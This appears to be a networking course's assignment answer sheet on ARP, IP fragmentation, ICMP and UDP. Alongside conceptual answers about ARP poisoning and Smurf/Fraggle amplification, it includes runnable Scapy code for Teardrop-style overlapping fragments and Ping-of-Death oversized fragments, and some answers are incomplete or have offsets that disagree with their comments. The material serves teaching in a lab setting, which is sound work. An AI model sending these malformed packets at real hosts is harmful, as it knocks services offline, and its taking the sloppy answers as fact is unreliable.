---
layout: default
course_number: CS335
title: Assignment 2 - Review
---

# Assignment Review – Ethernet, IP & ICMP and UDP
This assignment explores the fundamental protocols of computer networking, including Ethernet, ARP, IP, ICMP, and UDP, through hands-on experimentation in a Docker-based environment. The assignment also examines common network attacks—such as ARP poisoning, IP fragmentation attacks, and UDP amplification—to understand protocol vulnerabilities and security implications.

---

## Part I - Ethernet 

### Problem 1
Assume machines `A` and `B` are on the same network `10.3.2.0/24`.
Machine `A` sends spoofed IP packets.
- When `A` spoofs packets with destination `1.2.3.4`, `B` can observe them.
- When `A` spoofs packets with destination `10.3.2.30`, `B` cannot observe them.

There is nothing wrong with the spoofing or sniffing program. Explain why this behavior occurs. Why are packets to `10.3.2.30` never actually sent out?

**Answer**: If the destination is 10.3.2.30, the sender sees it as a local address and sends an ARP request to learn its MAC address. If no device owns that IP (or it’s offline), no one replies. Without a MAC address, the sender cannot create the Ethernet frame, so the spoofed packet is never sent—hence Machine B does not see it.

If the destination is outside the local network, the sender instead ARPs for the router’s MAC address. Since the router responds, the sender can forward the spoofed packet to the router, which then sends it onward.

### Problem 2
A computer with IP `10.8.8.5/24` tries to ping `10.8.8.8`. An ARP request is sent first. What are the values of:
- Destination MAC address (Ethernet header)
- Source MAC address (Ethernet header)

Explain your reasoning.

**Answer**: Destination MAC - `FF:FF:FF:FF:FF:FF` (broadcast address)
Source MAC - The MAC address of the computer with IP `10.8.8.5` (sender's own MAC address)

### Problem 3
A news report claims that outsiders sent spoofed ARP requests/responses from remote machines over the Internet to launch ARP cache poisoning attacks against York College’s internal network. Is this technically possible? Explain clearly.

**Answer**: ARP is a layer-2 protocol, so its request/response will
never get out of a local network. It is impossible to send a spoofed ARP request/response
remotely

### Problem 4
A computer with IP `10.8.8.5/24` tries to ping `10.8.8.100`, which does not exist on the LAN. Another machine on the same LAN is sniffing traffic. Will it be able to see the ICMP echo request? Why or why not?

**Answer**: No, since 10.8.8.100 is in the same /24 subnet, the sender first sends a broadcast ARP request. The sniffer will see this ARP request.

Because the host does not exist, no ARP reply is received. Without a destination MAC address, the sender cannot send the ICMP echo request, so the sniffer will not see any ICMP packet.

### Problem 5
Write a Python code snippet (Scapy recommended) that sends a gratuitous ARP reply to poison the ARP cache of machine `10.8.8.5`. Your attack machine is on the same LAN. Include:
- The Python code
- A screenshot proving the ARP table was poisoned

**Answer**: 
- The source and destination IP addresses are the same, and they are the IP address of the host issuing the gratuitous ARP.
- The destination MAC addresses in both ARP header and Ethernet header are the broadcast MAC address (`ff:ff:ff:ff:ff:ff`).
- No reply is expected.

### Problem 6
In the MITM attack demonstrated in class, attacker `M` uses ARP poisoning to redirect `A <-> B` traffic.
- If IP forwarding on `M` is off, what happens to the packets?
- If IP forwarding on `M` is on, what happens?
- If the attacker wants to modify packets, should IP forwarding be on or off? Explain.

**Answer**: 
- If IP forwarding is `off`, M does not route the packets onward.
- If IP forwarding is `on`, communication between A and B continues normally
- Off alongside sniff and spoof.

### Problem 7
A host on `10.8.8.0/24` has default gateway `10.8.8.1`. It tries to ping `93.184.216.34`. Before sending the ICMP packet, it sends an ARP request. What is the target IP address in the ARP request? Explain why.

**Answer**: It forwards the packet to its default gateway.

---
## Part II — IP & ICMP 

### Problem 1
Why is IP fragmentation necessary?

**Answer**: IP fragmentation is necessary because different networks have different Maximum Transmission Unit (MTU) sizes.

### Problem 2
Without receiving the last fragment, can a receiver determine the total size of the original IP datagram? Explain your answer.

**Answer**: No, the receiver cannot determine the total size of the original IP datagram without the last fragment.

### Problem 3
The IP Total Length field is `16` bits. Is it possible to spoof an IP packet larger than `65,535` bytes? If not, explain why.
If yes (in some indirect way), explain the mechanism.

**Answer**: Yes. This can be achieved using IP fragmentation. In each fragment, the IP Total Length field specifies only that fragment’s size, not the size of the whole datagram. For example:
- Fragment 1: offset = 0, size = 65532
- Fragment 2: offset = 65532, size = 65535

When reassembled, the receiver adds the fragments based on their offsets, producing a packet larger than 65,535 bytes. This shows how crafted fragments can create an oversized reassembled datagram.

### Problem 4
Please create two packets to emulate the Teardrop attack. Provide:
- Python code
- A brief explanation of how the overlap occurs

**Answer**:
A Teardrop attack exploits the IP reassembly process. 
- The attacker sends malformed, overlapping IP fragments to a target.
- The fragments have offsets that conflict when the target tries to reassemble them.

Overlapping fragments example: 

```python 
#!/usr/bin/python3  
from scapy.all import *  
import time

ID     = 1000
dst_ip = "10.9.0.5" 
  
# Fragment No.1 (Fragment offset: 0)  
udp = UDP(sport=7070, dport=9090, chksum=0)  
udp.len = 8 + 32 + 40 + 20
# UDP Header: 8 
# Fragment 1: 32
# Fragment 2: 40
# Fragment 3: 20

ip = IP(dst=dst_ip, id=ID, frag=0, flags=1)   
payload = "1" * 31 + "\n" 
pkt1 = ip/udp/payload
pkt1.show()
send(pkt1, verbose=0)
	  
# Fragment No.2 (Fragment offset: (8 + 32)/8 = 5)
ip = IP(dst=dst_ip, id=ID, frag=2, flags=1)   
ip.proto = 17 
payload  = "2" * 39 + "\n"  
pkt2 = ip/payload  
pkt2.show()
send(pkt2, verbose=0)

# Fragment No.3 (Fragment offset: (8 + 32 + 40)/8 = 10)
ip = IP(dst=dst_ip, id=ID, frag=5, flags=0)   
ip.proto = 17  
payload  = "3" * 19 + "\n"
pkt3 = ip/payload  
pkt3.show()
send(pkt3, verbose=0)
```

### Problem 5
Please create two packets to emulate the Ping-of-Death attack. Provide:
- Python code
- A brief explanation of how the overlap occurs

**Answer**: A Ping-of-Death attack is a denial-of-service exploit where an attacker sends malformed, oversized fragmented ICMP packets that exceed the 65,535-byte IP limit, causing vulnerable systems to crash when reassembling them.

```python
send ( IP(dst=target, id=1111, flags="MF") / ICMP() / ("D" * 65528) )
send ( IP(dst=target, id=1111, frag=8191) / ("D" * 100) )
```

### Problem 6
What is reverse path filtering? What is the purpose of such a mechanism?

**Answer**: A security feature that drops incoming packets if they arrive on an interface that would not be used to reach their source IP, helping prevent IP spoofing.

### Problem 7
Under what conditions does a router send an ICMP Redirect message?

**Answer**: A router sends an ICMP Redirect to a host when the host’s packet could take a better route via another router on the same subnet.

### Problem 8 
Can an ICMP redirect attack redirect traffic to a machine outside the LAN? Explain why or why not.

**Answer**: No, ICMP Redirects can only suggest alternative paths within the local network; they cannot force a host to send traffic to a machine outside the LAN.

### Problem 9 
The subnet is `10.0.2.0/24`. The directed broadcast address is `10.0.2.255`. Explain how directed broadcast can be abused to perform a denial-of-service attack. Name one historical attack associated with this technique.

**Answer**: Directed broadcast can be abused to amplify traffic toward a victim, overwhelming it with responses from many hosts. `Smurf attack` - which used ICMP Echo Requests sent to a directed broadcast address with a spoofed victim source IP.

---

## Part III - UDP 

### Problem 1
Why are ports `0–1023` restricted to root (privileged) users in Linux?

**Answer**: Ports `0–1023` are restricted to `root` to ensure only trusted processes provide critical services and to prevent security breaches from unprivileged users.

### Problem 2
In the following code:

```python
udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp.bind(("0.0.0.0", 9090))

```

What does `0.0.0.0` mean?

**Answer**: `0.0.0.0` tells the socket to listen on all interfaces of the host.

### Problem 3
What are the similarities between the Fraggle attack and the Smurf attack?

**Answer**: Both send packets to a directed broadcast address, causing all hosts on the subnet to respond. Smurf uses ICMP Echo Request (ping) while Fraggle uses UDP.

### Problem 4
An open-source program:
- Receives a UDP message
- Immediately sends a reply to the sender

Alice runs it on:
- `10.8.0.8:8000`

Bob runs it on:
- `192.168.0.7:7000`

1. Write a simple Python program to trigger a UDP ping-pong loop between them.
2. Explain how the program could be modified to prevent this vulnerability.

**Answer**: Modify the program so it does not blindly reply to every UDP packet, by validating sources, ignoring broadcasts, and applying rate limits to prevent amplification attacks.

### Problem 5
UDP services are commonly used in amplification attacks. Why is TCP generally not suitable for amplification attacks?

**Answer**: TCP is connection-oriented and requires a handshake, so servers cannot easily be tricked into sending large responses to spoofed IPs, unlike UDP.

---
## Grading Submission
Submit your lab report, including **screenshots**, via [Marmoset](https://cs.ycp.edu/marmoset) by the scheduled due date listed in the syllabus.
Your submission must include:
- Written answers
- Python code
- Command-line screenshots
- Wireshark screenshots
- Clear explanations of what each screenshot demonstrates

Reports without sufficient proof of experimentation will receive reduced credit.